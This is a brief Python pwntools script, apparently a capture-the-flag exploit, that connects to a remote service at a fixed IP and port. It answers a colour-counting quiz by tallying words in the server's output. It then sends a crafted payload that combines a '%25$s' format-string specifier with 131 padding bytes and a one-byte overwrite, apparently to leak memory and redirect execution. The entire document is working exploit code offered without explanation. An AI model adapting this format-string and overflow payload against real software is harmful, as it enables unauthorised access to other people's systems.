from pwn import *

rem = remote('152.96.15.2', 1337)
rem.recvuntil(b"? \x1b[?25h")
rem.sendline(b"y")
rem.recvuntil(b"\n\n")
presents = rem.recvuntil(b"\n\n")

red = presents.count(b"red")
yellow = presents.count(b"yellow")
blue = presents.count(b"blue")

rem.recvuntil(b"\n > ")
rem.sendline(f"{red}".encode())
rem.recvuntil(b"\n > ")
rem.sendline(f"{yellow}".encode())
rem.recvuntil(b"\n > ")
rem.sendline(f"{blue}".encode())
rem.recvuntil(b"name?\n > \x1b[?25h")
rem.sendline(b"A")
rem.recvuntil(b"else?\n > \x1b[?25h")
rem.sendline(b"%25$s" + b"A"*131 + b"\x84")

print(rem.recvall())
